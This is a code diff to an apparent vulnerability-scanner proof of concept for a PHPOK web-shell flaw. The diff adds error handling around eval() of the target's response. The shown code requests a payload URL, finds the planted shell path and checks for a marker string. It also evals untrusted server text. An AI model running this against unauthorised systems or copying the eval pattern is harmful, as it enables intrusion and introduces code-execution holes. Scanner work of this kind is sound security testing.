@@ -2,6 +2,7 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
+import sys
 
 class Vuln(ABVuln):
     vuln_id = 'PHPOK_0004_p'  # 平台漏洞编号，留空
@@ -39,12 +40,15 @@ class Poc(ABPoc):
             url = self.target + payload
             r = requests.get(url)
             #获取shell地址
-            r_dict = eval(r.text)
+            try:
+                r_dict = eval(r.text)
+            except Exception, e:
+                # self.output.info("远程文件没有执行")
+                sys.exit(1)
             r_value = r_dict['url']
             r_shell = '/' + r_value
             url_shell = self.target + r_shell
             r = requests.get(url_shell)
-             
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
